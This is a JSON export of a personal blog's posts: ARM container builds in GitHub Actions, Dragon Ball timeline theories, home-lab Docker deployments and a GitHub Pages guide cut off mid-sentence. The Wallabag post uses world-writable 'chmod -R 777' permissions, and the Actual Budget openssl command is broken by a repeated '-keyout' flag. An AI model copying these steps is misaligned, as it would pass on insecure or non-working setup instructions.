[ { "title": "GitHub Actions & ARM Architecture", "url": "/blog/posts/gha-docker-arch/", "categories": "Computers and Fun", "tags": "github-actions, docker, container, cicd", "date": "2024-06-06 18:52:00 -0400", "snippet": " This blog post covers my troubleshooting efforts and research on how we can use GitHub workflows for various architectures. It focuses more on how to build container images for ARM in the absence...", "content": " This blog post covers my troubleshooting efforts and research on how we can use GitHub workflows for various architectures. It focuses more on how to build container images for ARM in the absence of native ARM runners and the state of such things in mid-2024 (this means any improvements made after mid-2024 were not considered when writing this content).GitHub Actions PrimerGitHub allows building projects and code artifacts from a given project using GitHub Actions (GHA). Actions can be configured using YAML configuration files within the directory structure .github/workflows/ to specify what to build or test and how. These “workflows” can be initiated by specific triggers or based on schedules (i.e., cron). A workflow defines multiple jobs independent of or dependent on one or more other jobs. Jobs usually have steps, where each step is something that the runner executes.Steps can be usual Linux (shell) code that we define, or they can be prepared procedures, also called actions, that GitHub and the open-source community maintain in the actions marketplace. One example is the actions/checkout@v3, which is used as a starting step to checkout code from the repository into the runner. Many different kinds of actions can aid in several tasks, such as code analysis, linting and testing, building and pushing container images, sending notifications, and many other things. Quick thing to note: if you have hawk-eyes, you realize some actions you might perform on the runners require internet access. In Organizations, these actions and how they can be initiated (like from non-restricted branches) are some of the most common ways CI/CD systems are compromised.Runners and the State of ARMGitHub runners can run Linux or MacOS. We can also define the architecture, but things get complicated here. By default, though, it’s x86-64. Usually, most laptops and business machines used to be x86-64 (generally Intel processors). Most cloud machines also defaulted to the same architecture. ARM64 was primarily used in embedded devices, Raspberry Pis, and smartphones - none of which captures the essence of deployments and running applications because that’s what GitHub actions and other CI/CD constructs are used for.All of this changed, and the state of ARM observed a massive shift in adoption at the end of 2020 due to Apple launching the M1 series of processors, which can be seen as the big brother of Apple’s high-performant chipsets from previous iPad pros. With the popularity of those M-series laptops, everyone who bought a laptop, including most businesses that relied on Apple computers had ARM64 processors. That’s where issues with cross-architecture builds came to light.Apple launched Rosetta - an emulator to support x86-64 code by performing dynamic translation of the instruction set from x86-64 to ARM64 before an x86-64 process is executed. However, several apps still didn’t run on this, and things like debugging or writing code that runs for everyone became harder and harder. Many open-source projects don’t support ARM (ARM64 or aarch64) today! Projects can be built manually wherever needed, but that had two issues → Building from scratch takes time as compared to using pre-built binaries Projects can depend on other projects that don’t have ARM variants, which will cause the build to failWith all that, we’re in this state of limbo where some things have ARM variants, and others don’t. This was one of the primary issues I faced when building my Containerized Security Toolkit. The good thing is that GitHub runners immediately started supporting the ARM MacOS machine type, likely through some sort of Mac Mini farm. However, the drawback is that the MacOS runners do not support containerization, so we can’t build ARM Docker images, for example. All this is almost old news now, as GitHub just launched native ARM runners for everyone.Solutions for Running ARM ImagesSo, with GitHub’s latest launch of ARM64 runners, why do I want to talk about old solutions? Because it shows what I did in the absence of ARM runners to maintain my tool and represented a good learning experience worth documenting. The only thing I’ll focus on to demonstrate solutions is building container images. They’re a great way to escape dependency hell and the easiest first step to universalizing software builds. Projects sometimes have releases of both ARM64 and x86-64, but it’s possible by using these solutions.The easiest solve for any simple project was to switch to a DevOps provider that supported ARM64 runners. CircleCI was one such provider, and I switched to it for my Containerized Security Toolkit project. Native ARM runners work great and do not compromise on speed at all. However, this only solved some things; what about organizations already on GitHub that didn’t want to subscribe to CircleCI? What about the runner limits, which could be much more forgiving on GitHub?I maintain a similar container-based project in my organization and couldn’t rely on CircleCI. So, I took the next best solution - using Rosetta and other emulators locally to build and push images to container registries. Of course, this is an imperfect solution because of the operational effort, so the next step was to run virtualized builds on x86-64 GitHub runners. Specifically, this would involve using QEMU (keemu, q-e-m-u, I don’t know at this point) and Docker BuildX. I initially implemented this as a solution for my Containerized Security Toolkit project before switching to CircleCI. The only drawback is the slow build time due to virtualization, which is why many projects don’t have releases for ARM64. The other drawback is that Docker build operations for multi-stage builds can consume all disk space and fail. Quick tip - Apple’s Rosetta is great on Macs for emulating some things, but it’s not flawless. Docker natively supports Rosetta and can use that to run x86-64 images; however, some specific images may still not work. It’s still very convenient and impressive.Let’s explore emulated builds in more detail.Building ARM Images in x86-64 RunnersAs I mentioned above, building an ARM image in the x86-64 runners requires emulation through QEMU and Docker BuildX. Docker Docs also mentions that the build-push-action action can be used to specify the platforms for which the image is built. However, several times, there are multi-stage builds involved, and it’s more complex than calling the action. Therefore, I’ll detail this via a build script in the workflow file. Before getting into the details of that, the caveats with using QEMU are as follows → Slow build times due to QEMU The need for a Dockerfile rewrite depending on what software we’re running because not many tools and libraries are written in multi-platform (this doesn’t go away with the native runners, though) Easier to run out of disk space - may need multi-stage builds, which can’t be done using the build-and-push action; for example - the image I build in Containerized Security Toolkit uses multi-stage build and a build script to aid the build processWhen used in GitHub, a multi-stage build script would need a code snippet like so for initiating the build of an image →docker buildx build -o type=docker --platform=linux/arm64 -f Dockerfile -t image:tagLet’s dissect this command for understanding → docker buildx build → this part tells Docker to use buildx to build the image -o type=docker → this part is necessary because the intermediate images in a multi-stage build do not get cached into the local disk of the runner, so when the next build stage is triggered, Docker attempts to pull the previous stage from Docker Hub instead of locally; setting type to docker sets the export type to an image format which will be cached locally --platform=linux/arm64 → this specifies the architecture for which the image is being built -f Docker.file → this can be omitted if the file is named Dockerfile, but is needed for other filenames, especially in multi-stage builds -t image:tag → default tag is latest, but that does not work for local caches between multi-stage builds for buildx (works on local computers but not inside GitHub runners); so, a tag must be specified and used in the next stageIn totality, additional actions are also needed to set up the workflow with QEMU and BuildX. An example workflow file is as follows →name: Build ARM Imageon: push: branches: - 'main' workflow_dispatch:jobs: docker: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Set up QEMU uses: docker/setup-qemu-action@v3 - name: Set up Docker Buildx uses: docker/setup-buildx-action@v3 - name: Login to DockerHub uses: docker/login-action@v3 with: username: $ password: $ - run: docker buildx build -o type=docker --platform=linux/arm64 -t image:tag . - run docker push image:tagConclusionWe’ve explored how building an ARM docker image would look on GitHub actions. Multiple options are discussed, but my true recommendation is to use the new and shiny GitHub ARM runners or CircleCI. The QEMU/BuildX method could still be useful for limited self-hosted runners. But really, all this was just about sharing the adventure." }, { "title": "Dragon Ball Super - Zamasu Timeline 101", "url": "/blog/posts/dbs-zamasu-timeline/", "categories": "Just Fun Things", "tags": "anime, dragon-ball", "date": "2024-02-03 23:19:00 -0500", "snippet": "Whats and WhysI did a similar writeup on Dragon Ball Z’s Cell saga timeline earlier. Just like in Z, Super also had a saga involving Future Trunks and, therefore, another time travel mystery. An in...", "content": "Whats and WhysI did a similar writeup on Dragon Ball Z’s Cell saga timeline earlier. Just like in Z, Super also had a saga involving Future Trunks and, therefore, another time travel mystery. An in-depth understanding of this timeline isn’t necessary to enjoy the story. Like Z, many people feel there are only two timelines in the Zamasu saga of Dragon Ball Super. I’ll present my theories on how this is a quad-timeline story and how a 5th timeline came into existence.A very brief recap of the Zamasu saga → Future Trunks goes back in time because Goku Black is terrorizing his world. Black somehow follows back and fights Goku. Beerus and Whis thought the energy was similar to Zamasu from Universe 10. When Goku, Vegeta, and Trunks go to the future, Black achieves Super Saiyan Rose and is stronger than all Z fighters. With this knowledge, they head back to the present, where Beerus deals with a scheming Zamasu; however, that godly act didn’t erase the future Zamasu because he wore a time ring. After multiple back and forths in the time machine, Zamasu is partially defeated and becomes an ether to be destroyed by Zeno. Whis then takes Trunks and Mai back to their past and fixes everything by talking to the then Beerus, and Trunks and Mai live with another version of them.Concepts &amp; ExplanationsConcepts of TimeAll of the concepts of time from the Dragon Ball Z blog still hold. However, one of the rules is of significant importance. We established that when a time traveler goes back the first time, it causes a split in the timeline, after which the traveler can travel back and forth without further changes unless another time traveler is involved.The thing to note here is that while Trunks can travel freely between his timeline and the show’s (the one we watch) timeline, if any or several of the Z fighters go back with Trunks, that’s considered a new traveler. However, if the new traveler shares context with the old traveler, the timeline of the new traveler is affected because he’s the one gaining otherwise foreign context. So, when Goku, Vegeta, and Bulma travel to the future with Trunks and return, they are the ones with new context, which results in a split.While such a split does happen, it doesn’t need to occur at the point when the traveler travels back. It could also occur at a point earlier than that, where the normal flow of time would end up resulting in the traveler infringing with time. We’ll revisit this through a flow chart.The Timelines of the Zamasu SagaThis diagram represents time as a sequence of events for each of the timelines created during the Zamasu saga. The main timeline and the Future Trunks timeline are continuations of their named counterparts from the Cell Timeline blog post.Legend → Main Timeline → Shown in blue; this is the timeline that we follow in the show, which goes on to the Tournament of Power. Future Trunks Timeline → Shown in green; this is where the actual future Trunks is from, the one where Goku Black first appears. New Future Trunks Timeline → Shown in black; this is where two versions of Trunks and Mai exist after Whis fixes their timeline by traveling through time. The Fifth Timeline → Shown in brown; this is the timeline that was created as a result of either Black showing up in the main timeline, Goku and Vegeta returning with context about Black and Zamasu being partners, or Beerus destroying the main timeline’s Zamasu. The consequence of each of these actions is the same as far as time is concerned, so it’s more important to note that a split happened rather than when the split happened. Based on the story provided by the Anime, it’s hard to pinpoint this exact moment. Thankfully, that doesn’t present itself as a plothole and still fits well with the rest of the theory.The red artifacts are all acts of Gods. The orange text explains situations.Special Events ExplanationFor simplicity’s sake, we’ll refer to the Zamasu that becomes Goku Black as Black, even before he becomes Black. On that note, the following is the explanation of some of the important events across all the timelines → When Trunks returned to the main timeline, Black was already wearing the time ring. The time ring reacted to the space from which the time machine vanished. While the time ring can only be used to travel to the future and back again, it could be that the time machine allowed the time ring to follow it into its “future” (the time machine’s future would be the past or the main timeline). That’s why even though Black made it to the main timeline, time automatically started correcting itself, which is why it pulled Black back into the timeline he traveled from. Beerus killing the main timeline’s Zamasu, Goku fighting Zamasu, or the return of Z fighters from the Future Trunks timeline; any of these events could have caused a split of the main timeline. It could also be the temporary trip of Black from the Future Trunks timeline to the main timeline. However, it is most likely that when Goku and Vegeta traveled back from Future Trunks timeline, they gained additional context to affect their timeline (it was after this when Beerus and Whis went to monitor and stop the death of Gowasu and destroy Zamasu). Black got Goku’s body using the Super Dragon Balls from the timeline that resulted from the previously mentioned split because Beerus does not destroy Black (Zamasu). This Black travels to the Future Trunks timeline using one of the 4 time rings formed due to Bulma’s time machine during the Cell saga. My guess is that this timeline was partially randonly chosen. Partially because - time rings can take to the future, so Black probably also checked the main timeline and found that his counterpart was not alive there. However, he was alive in the Future Trunks timeline because Goku was already dead before meeting Zamasu. Black kills the Gowasu from the Future Trunks timeline, recruits Zamasu, and uses Super Dragon Balls to make him immortal. Zeno destroyed the Future Trunks timeline after ether-Zamasu was formed. Trunks and Mai returned with the Z fighters to the main timeline. This is also a special event, as Mai’s tag-along doesn’t cause a split because nothing she offered was new to the main timeline. Whis takes Trunks and Mai to a point in the Future Trunks timeline before Black kills Gowasu and asks Beerus to destroy the then Zamasu. Then, no other Zamasu in other timelines had a time ring to protect him, so this caused all the Zamasu to be destroyed, as initially claimed by Beerus.Something to Notice; FinWhen the arc ends, the main timeline’s Gowasu places 5 time rings (those associated with splits) in the box and locks them away. However, we explored 2 new timelines apart from the 4 from Cell saga - the Fifth timeline and the New Future Trunks timeline. So what’s the discrepancy?The New Future Trunks timeline continues the old Future Trunks timeline. This should still be considered as the same timeline because Zeno destroyed that timeline, and Zeno is a complete wild card. It is possible he somehow destroyed the entire segment of Black, which erased everything up to the point when Whis takes Trunks and Mai. Zeno is the CREATOR! So, this is plausible. But in any case, when Gowasu places those rings in the box at the moment in the main timeline, the old Future Trunks timeline is the same as the New Future Trunks timeline. Therefore, the only new timeline is the Fifth timeline, where Black is originally from.That’s my complete interpretation of the time-related concepts from the Zamasu arc of Dragon Ball Super. Phew!" }, { "title": "Wallabag in Home Lab", "url": "/blog/posts/homelab-wallabag/", "categories": "Home Server", "tags": "reader, bookmarks, wallabag, home-lab", "date": "2024-01-20 11:37:19 -0500", "snippet": "Wallabag is a read-it-later application for storing bookmarks. It automatically extracts the readable text and images and stores in a reader-format, which can also be exported as PDF, TXT, EPUB, an...", "content": "Wallabag is a read-it-later application for storing bookmarks. It automatically extracts the readable text and images and stores in a reader-format, which can also be exported as PDF, TXT, EPUB, and more. The best way to use it is to throw in blogs and links we find everyday and get back to them later when free.Wallabag can be deployed using docker-compose. I recommend doing it with a container management service like Dockge or Portainer. First, create a directory for persistence as follows →mkdir -p $HOME/wallabag/{data,pgdata} &amp;&amp; \\mkdir -p $HOME/wallabag/data/db &amp;&amp; \\chmod -R 777 $HOME/wallabag/The chmod step is needed because wallabag tries to create an SQLite DB within the data/db directory and without the necessary permissions to the “other” groups, it will fail.Then create the compose stack. The stack definition to use is as follows →version: \"3.8\"services: wallabag: image: wallabag/wallabag ports: - 5002:80 volumes: - /home/tanq/wallabag/data:/var/www/wallabag/data - /home/tanq/wallabag/images:/var/www/wallabag/web/assets/images environment: - SYMFONY__ENV__DOMAIN_NAME=http://192.168.86.32:5002Another thing to mention here is that the above compose file will launch wallabag with a simple SQLite backend. Wallabag also supports MariaDB/MySQL and Postgres with Redis. The templates for those define additional containers for the DB and cache-DB. My use case is relatively limited, so I went with the simplest deployment. If you need a more robust backend, the appropriate config file can be found here.Well, that was a quick 101 for deploying Wallabag locally! Happy content-reading!" }, { "title": "Bookmark Manager in Home Lab", "url": "/blog/posts/homelab-linkwarden/", "categories": "Home Server", "tags": "bookmarks, linkwarden, home-lab", "date": "2024-01-15 01:03:10 -0500", "snippet": "IntroThere are probably a hundred different ways to manage links and bookmarks. People use Chrome’s bookmarks, some use an extension like Toby, and others store them on GitHub. There are also many ...", "content": "IntroThere are probably a hundred different ways to manage links and bookmarks. People use Chrome’s bookmarks, some use an extension like Toby, and others store them on GitHub. There are also many bookmark manager apps, dashboard applications, and even command-line tools that can manage bookmarks. Once again, I turn to the amazing open-source community in search of projects.I identified 3 projects that I liked the best → Linkwarden Linkding LinkAceOf these, I went with Linkwarden, but really - all of them are amazing. Why not use Chrome or something simpler? Just because I wanted something in my home lab and easily accessible across multiple computers and accounts. Plus all of this is local-first, so maintaining security becomes easy.DeploymentLinkwarden can be deployed using docker-compose. I recommend doing it with a container management service like Dockge or Portainer. First, create a directory for persistence as follows →mkdir -p $HOME/linkwarden/{data,pgdata}Then create the compose stack. The stack definition to use is as follows →version: \"3.8\"services: postgres: image: postgres:16-alpine env_file: .env volumes: - /home/tanq/linkwarden/pgdata:/var/lib/postgresql/data linkwarden: env_file: .env environment: - DATABASE_URL=postgresql://postgres:${POSTGRES_PASSWORD}@postgres:5432/postgres image: ghcr.io/linkwarden/linkwarden:latest ports: - 5007:3000 volumes: - /home/tanq/linkwarden/data:/data/data depends_on: - postgresnetworks: {}The .env file (Dockge, for example, provides a section to specify the contents easily) should contain the following →NEXTAUTH_SECRET=linkwarden # changeNEXTAUTH_URL=http://localhost:5007/api/v1/auth # port must match the exposed onePOSTGRES_PASSWORD=linkwarden # changeWith this, the applications will be deployed.FinWell, hope that’s a quick 101 for deploying Linkwarden locally! One of the best features of Linkwarden (and several other apps too) is link archives. Using this functionality, Linkwarden can store a screenshot, image, and archive.org snapshot for each of the links. This is pretty useful. Happy bookmarking!" }, { "title": "Personal Finance Budgeting in Home Lab", "url": "/blog/posts/homelab-budgeting/", "categories": "Home Server", "tags": "budgeting, personal-finance, actualbudget, home-lab", "date": "2024-01-14 15:53:00 -0500", "snippet": "IntroPersonal finance is more than just a practice - it’s a skill. But at the same time, finding a good, privacy-focused application to help manage personal finances is very hard. Many applications...", "content": "IntroPersonal finance is more than just a practice - it’s a skill. But at the same time, finding a good, privacy-focused application to help manage personal finances is very hard. Many applications are either paywalled for tiers of features, or hold your data hostage to make migration harder. Of course, there are good paid services as well, but an open-source application that can be deployed in our home labs - that’s what I’m after. Actual Budget is such an application.I also wrote a tool called Budgeter for very straightforward tracking of expenses and nothing else. For anything more complicated than that, Actual Budget is amazing.DeploymentThe Actual-Server is a self-contained backend and a web application container. Here is a one-liner deployment command →mkdir -p $HOME/actualbudget &amp;&amp; \\docker run -v $HOME/actualbudget/:/data --name actual-budget --rm -p 5006:5006 -d -t actualbudget/actual-server:latestHowever, opening this on the browser might lead to an error that requires visiting over https. For that, we need to set up a certificate and configure the server to use that self-signed certificate. The following commands can be used to do that →openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout actual.key -keyout actual.crtcat &lt;&lt; EOF &gt; $HOME/actualbudget/config.json{ \"https\": { \"key\": \"/data/actual.key\", \"cert\": \"/data/actual.crt\" }}EOFmv actual.key actual.crt $HOME/actualbudget/After this, the container will be deployed at localhost:5006 over HTTPS. A better way to deploy it is using docker-compose either directly or through Dockge. Use this stack definition →version: '3.9'services: actual-server: image: 'actualbudget/actual-server:latest' ports: - '5006:5006' container_name: actual-budget volumes: - '/home/tanq/actualbudget/:/data' # Change appropriatelyBackup and FinBackups are another piece of the puzzle. I recommend manual backups for your home lab server, so this data is included automatically. Still, you can easily set up rsync for backing up to local NAS or other more sophisticated backup utilities triggered via cron jobs. In the spirit of automating everything, you could also use Dropbox API and Python in a script triggered by cron jobs to make a tarball from the expense data and back that single file to the cloud.With that, you can deploy your own amazing personal finance software. Good luck!" }, { "title": "Dragon Ball Z - Cell Saga Timeline 101", "url": "/blog/posts/dbz-cell-timeline/", "categories": "Just Fun Things", "tags": "anime, dragon-ball", "date": "2024-01-13 12:13:00 -0500", "snippet": "Whats and WhysTime travel has always been a fascination of the entertainment industry and Anime is no exception. Complicated timelines and going back in time to change history are very common conce...", "content": "Whats and WhysTime travel has always been a fascination of the entertainment industry and Anime is no exception. Complicated timelines and going back in time to change history are very common concepts. But portraying them properly is hard and often gets very convoluted in the finished product. Also, because information about the storyline is mixed in with the time travel concepts, many a times it can make it harder for the viewers to understand the nuances completely.Usually, an in-depth understanding of such concepts isn’t necessary to enjoy the story. For example, many people still feel like there were only 2 timelines in the Cell saga of Dragon Ball Z. There’s nothing wrong with not knowing, but it’s also a fun exercise to decipher everything as accurately as possible. Sometimes it can also help draw out further admiration for the story writer. So, I decided to do the same for DBZ’s Cell saga.A very brief recap of the Cell saga → Future Trunks goes back in time because his world is being terrorized by Androids 17 &amp; 18. There, he saves Goku from dying of a virus and helps the Z fighters fight the Androids. But another bionic Android - Cell, had also travelled back to a point 1 year before Trunks did, so that he could absorb the Androids 17 &amp; 18 to become perfect and gain power. Z fighters destroy the baby Cell from the present and find that the Cell they would fight was actually from the future where he had killed Trunks and hijacked his time machine.Now many people are content with contextualizing this story over just 2 timelines - the present and the future. But that is of course incorrect, because clearly the Future Trunks in the present cannot be alive if Cell killed him in the same future. Follow along to get a flow chart and explanation.Concepts &amp; ExplanationsConcepts of TimeTo make sure that my theory makes sense, the following concepts are essential → Time can be thought of as a continuous straight line. Any trip made to the past with the intention of changing something either at that point or in the future of that time, results in a timeline split. Think of this as the straight line breaking in 2. When a timeline is split, both the components are now individual timelines with unique characteristics. A change in one timeline does not affect any other timeline, but if an individual changes in an alternate timeline, that change is carried over when the individual traverses time. The Capsule Corp time machine made by Bulma can be used to travel back and forth between 2 timelines only, i.e., the two parts of the split that takes place as a result of the same travel. Once a timeline is split, both are completely affected by the action and neither timeline suffer from further changes irrespective of subsequent hops unless another time machine or another time traveller is involved.Now that’s a complicated set of rules! But it was extremely engaging to think about all of this!The Timelines of the Cell SagaThis diagram is a representation of time as a sequence of events for each of the timelines that were created during the Cell saga. I’ve omitted dates from it because they are unnecessary to understand what happened. The only numerical value that has some significance is 1 year, which was the difference in time between when Future Trunks and primary Cell travel back in time.Legend → Main Timeline → Shown in orange; this is the timeline that we follow in the original show, which goes on to the Buu saga where Majin Buu was unleashed and the Z fighters were alive. Future Trunks Timeline → Shown in blue; this is where the actual future Trunks is from, the one who manages to kill both the Androids and the Cell from his timeline. Cell’s Timeline → Shown in black; this is where the primary timeline infringement occurs. It’s also the first and the only timeline to exist since before the Cell saga. Overlooked Timeline → Shown in pink; this is the timeline that we have the least information on. It’s easy to determine a very plausible answer to “what could have happened?” but not so much for “how did it happen?”. But, it’s still free of a plothole and fills in all gaps to accurately depict the time travel. Green text shows the activities or describes what was happening during a given period. The pink box with pink text above the blue timeline highlights a plothole (yes, couldn’t be without one unfortunately) within the Future Trunks timeline.All the timelines actually stem from a single unified timeline (Cell’s timeline). The sequence of the splits and who caused the splits is shown below.There is also more proof of this in Dragon Ball Super where we see that Gowasu, the Supreme Kai of Universe 10, was asked to show his time rings by Beerus. That’s when we learnt there are 4 timelines as there as 4 rings.Flow Chart ExplanationReasons for the Overlooked TimelineCell told Piccolo that he hijacked Trunks’ time machine because he had already disposed of the Androids and was probably headed back in time to tell the Z fighters that he had done so. Cell killed Trunks for the time machine. Ergo, perfect Cell in the present came from a timeline where Future Trunks was no longer alive. So it’s clearly not the Future Trunks timeline, otherwise the Trunks (from the show) who travelled back in time and then returned to kill the Androids and Cell in the future could not exist. So, the Trunks that Cell killed must have been a different timeline from Future Trunks’.Now, Trunks would not have been defeated by Cell if he had undergone the training in the Hyperbolic Time Chamber. Also, since Cell didn’t interfere before Trunks (Trunks was the first to travel), the Androids wouldn’t have become stronger due to time infringement. So clearly, the timeline to which the first time travel occured is a different timeline where Trunks just saved the Z fighters i.e., the overlooked timeline.We can actually go a step further and further increase accuracy - in the show, Cell tells Piccolo that when he killed Trunks and hijacked the time machine, the machine was already set to go back 1 year before the point when Goku was to arrive on the Earth and Trunks had done so to tell the Z fighters that the Androids were no longer alive. It doesn’t make much sense for Trunks to break the news this way, so a more plausible theory is that he figured out the location of Dr. Gero’s lab and wanted to create a new timeline where all he did was remove the Androids from existence and let time flow normally otherwise (it’s a stupid move but oh well).The plotholeThe plothole I posed was as follows → Regressed Cell remains in this timeline, but it is hard to say what he may have been doing. Was he dormant/killed?I say this based on the fact that Cell from the initial timeline travelling back created the Future Trunks timeline. This is because the point in time where Cell travelled to was a year before when Trunks came in. So, the timeline that Trunks split would be the one where Cell (regressed larvae form) was already present. Cell’s split became the Future Trunks timeline and Trunks’ split became the main timeline (the actual show).Now, we know that when Trunks returns to the Future Trunks timeline, he destroys the Androids and kills Cell at the same time. This Cell was actually the Cell that was growing over the past 20 years from that point and belonged originally to the Future Trunks timeline. However, there is also a regressed Cell, originally from the Cell’s timeline (Initial Time Mess Up), that should have existed since much before Trunks was born. So even if it took 4 years for the regressed Cell to transform into the imperfect Cell, he would have enough time to absorb the Androids. But he was not mentioned in the story anywhere. It is also hard to fathom that anyone could’ve defeated him because Trunks was the only Z fighter alive and he did not get the Hyperbolic Time Chamber training yet.Other Plotholes?The reason I call the plothole I identified as a “plothole” is because it is very hard to come up with a sensible and plausible explanation. There are definitely other plotholes present throughout the Cell saga, but those can be explained with a believable story in line with what our amazing Z characters would have done. Writing such amazing stories is hard, so I don’t consider those plotholes, rather than blanks that should be filled in by the viewer based on interpretation. The plothole I highlighted is emphasized because it is not easily explained. But all of this was a very fun exercise that augmented my admiration for the show." }, { "title": "Excalidraw in Home Lab", "url": "/blog/posts/homelab-excalidraw/", "categories": "Home Server", "tags": "budgeter, excalidraw, whiteboard, home-lab", "date": "2024-01-13 11:29:00 -0500", "snippet": "ExcalidrawExcalidraw is an open source infinite-canvas whiteboard software. It is primary local-first and the public hosted version is end to end encrypted, with support for live collaboration as w...", "content": "ExcalidrawExcalidraw is an open source infinite-canvas whiteboard software. It is primary local-first and the public hosted version is end to end encrypted, with support for live collaboration as well. The online version of the software has some additional features as well, such as generative AI features, a laser pointer for presentations, and mermaid diagram to excalidraw functionality.For me though, I want to avoid sending what I draw over the internet. So, the local-network version of the application is a much better alternative for me. I don’t want to use AI features or the laser pointer. That makes this application an awesome addition to my home lab services.DeploymentHere is a one-liner deployment command →docker run --name excalidraw --rm -p 80:80 -d -t excalidraw/excalidraw:latestAfter this, the container will be deployed at http://localhost/. A better way to deploy it is using docker-compose YAML either directly or through Dockge/Portainer/Yacht. Use this stack definition →version: \"3.8\"services: excalidraw: restart: unless-stopped ports: - 5004:80 image: excalidraw/excalidraw:latestnetworks: {}FinEnjoy creating local-first charts on this beautiful whiteboard-style application!" }, { "title": "Expense Tracking in Home Lab", "url": "/blog/posts/homelab-budgeter/", "categories": "Home Server", "tags": "budgeter, expense-tracking, home-lab", "date": "2023-09-29 16:23:00 -0400", "snippet": "Whats and WhysI wrote a tool called Budgeter for one straightforward reason - to track expenses. There are so so so so many tools out there that do the same. And they do it so well, with so many fe...", "content": "Whats and WhysI wrote a tool called Budgeter for one straightforward reason - to track expenses. There are so so so so many tools out there that do the same. And they do it so well, with so many features. What I wrote is too simple, so why not just use one of the existing tools? I was using one too! I preferred Spendee but migrated from it for two reasons → I wanted something for my home server and something that does exactly what I want.Budgeter is primarily a simple API-based service to which I can add data using POST requests. I wanted data addition to be very quick, so making it a simple POST request allows me to add data through a Siri Shortcut, which also doubles as a friendly UI to add data. I can also create custom graphs in whatever way with precisely the type of analysis I want to do (PS: I still have yet to write the analysis part, but I don’t analyze that often, so it’s okay). Lastly, I wanted to do it without adding unnecessary details (unless needed). This is because, generally, the analysis that matters contains what we’re spending on and when. For example, “I spent 200$ last week on food, but a total of 300$ in the last month on food” is more important than “I had cheesecake factory 3 times in the last week”. This means skipping the notes, tags, etc., and sticking to 2 things - category and amount. I also don’t need to maintain my entire net worth on an app by tracking income because income trickles in regularly, and I can monitor that through emails. Monitoring trends rather than specifics is essential, so I decided to store monthly data in JSON to make it easily readable and plottable.Another reason for getting out of third-party apps is to reduce tracking and service vendor lock-in. I appreciate the hard work of app developers and hope they get funded for their work, but at the same time, if I can write code in some capacity, why commit to another app unnecessarily when it’s more interesting and this way? The vendor locking thing shows up in random places for different apps; for example, I couldn’t export my expense data older than a year without a premium subscription….. 🤔 ??? it’s my data……!!! 🙄DeploymentHere is a one-liner deployment command →mkdir -p $HOME/expense-data; docker run -v $HOME/expense-data/:/expense-data --name budgeter --rm -p 80:5000 -d -t tanq16/budgeter:main# use tag :main_arm for ARM64 imageAfter this, the container will be deployed at localhost:80. A better way to deploy it is using docker-compose either directly or through Portainer. Create a volume for it with mkdir -p $HOME/expense-data and use this stack definition for Portainer →services: budgeter: image: tanq16/budgeter:main container_name: budgeter networks: - servicesnet volumes: - /home/username/budgeter:/expense-data # replace with correct path ports: - 5002:5000networks: servicesnet:Backing UpBackups are another piece of the puzzle. I’m doing manual backups for my home lab server, so this data is included automatically. Still, you can easily set up rsync for backing up to local NAS or other more sophisticated backup utilities triggered via cron jobs. In the spirit of automating everything, you could also use Dropbox API and Python in a script triggered by cron jobs to make a tarball from the expense data and back that single file to the cloud (I have yet to attempt this one).MigrationI migrated from Spendee after exporting a CSV from the service. Custom scripts are required for different types of exports. For Spendee, I used this code →import csvimport jsonfrom datetime import datetime# Define a dictionary to map category names to actual valuescategory_mapping = { \"Credit Card Offer\": \"ignore\", \"Food &amp; Drink\": \"food\", \"Miscellaneous \": \"personal\", \"Car/Cab\": \"travel\", \"Family\": \"family\", \"Groceries\": \"groceries\", \"Healthcare\": \"personal\", \"Home\": \"home\", \"Investments\": \"investing\", \"Miscellaneous\": \"personal\", \"Personal\": \"personal\", \"Refunds\": \"ignore\", \"Salary\": \"ignore\", \"Shopping\": \"shopping\", \"Subscriptions\": \"subscriptions\", \"Transport\": \"travel\", \"Travel\": \"travel\"}def preprocess_data(row): amount = -float(row[\"Amount\"]) category = category_mapping.get(row[\"Category name\"], row[\"Category name\"].lower()) reduced_date = datetime.strptime(row[\"Date\"], \"%Y-%m-%dT%H:%M:%S+00:00\").strftime(\"%d-%m-%Y\") return { \"date\": reduced_date, \"category\": category, \"amount\": amount, \"note\": row[\"Note\"] }final = {}with open('transactions.csv', 'r') as csvfile: reader = csv.DictReader(csvfile, delimiter=',') for row in reader: processed_data = preprocess_data(row) month_year = processed_data[\"date\"][3:10] if processed_data[\"category\"] == \"ignore\": continue if processed_data[\"amount\"] &lt; 0: continue if not month_year in final: final[month_year] = [] final[month_year].append(processed_data)for i in final: with open(i + \"-expenses.json\", 'w') as jsonfile: json.dump(final[i], jsonfile, indent=4)For any other platform, try to get CSV export ready and modify the fields directly in the CSV to match those of the above script or modify the script to match the export data.Setting up a Siri ShortcutA Siri Shortcut can be set with the following parameters to enable adding expenses via the API →For the iPhone, the Shortcut can be added to the home screen as a bookmark, so it becomes a trigger such that as soon as it is clicked, it launches the interface to record the expense." }, { "title": "Hosting a Website using GitHub Pages and Jekyll", "url": "/blog/posts/website-jekyll-ghpages/", "categories": "Computers and Fun", "tags": "github-pages, github, jekyll, deployment", "date": "2023-09-09 17:52:00 -0400", "snippet": "Covering BasesGitHub Pages is a straightforward method to deploy a website right from a GitHub repository, especially for those with computer science skills. In a very simplistic way, GitHub pages ...", "content": "Covering BasesGitHub Pages is a straightforward method to deploy a website right from a GitHub repository, especially for those with computer science skills. In a very simplistic way, GitHub pages can simply use the repository root as the webroot and serve a website from there. It can also serve from a specific branch.The deployment of pages can be executed via GitHub Actions (GHA) or directly from a GitHub branch. Of course, there are two basic ways of deploying sites in GitHub: we write normal website code and push it to a branch for GitHub to serve from, and we use static site generators like Jekyll. Check out GitHub documentation for more details.The limitations of GitHub pages to keep in mind are → GitHub only serves static content, so there’s no particular server-side processing through PHP, node backend, etc. Site content from the repos can be a maximum of 1 GB, meaning videos, music, photos, etc., are typically best placed elsewhere and not inside the repo.Read the other limitations as well, but those are the key ones. Based on these limitations and the type of people who generally use GitHub pages, such sites are best used for portfolio websites, blogs, and documentation sites. Of course, there are other uses, but these sites are easy to maintain and best suited for version-controlled code.Custom DomainsGitHub also (obviously) allows the use of custom domains. Put simply, these are several domain-related scenarios for GitHub pages → No domain, primary site → The best way to make a portfolio without a custom domain is to deploy it as &lt;username&gt;.github.io. To do this, one must make a repo with the name &lt;username&gt;.github.io and deploy their site there. The site is then accessible at https://&lt;username&gt;.github.io. Primary site with domain → GitHub pages allows setting a custom domain from the repo settings page. It’s pretty straightforward, and after setting it up, the site is accessible at the domain. Example - https://tanishq.page is deployed similarly. Setting up a domain also requires some 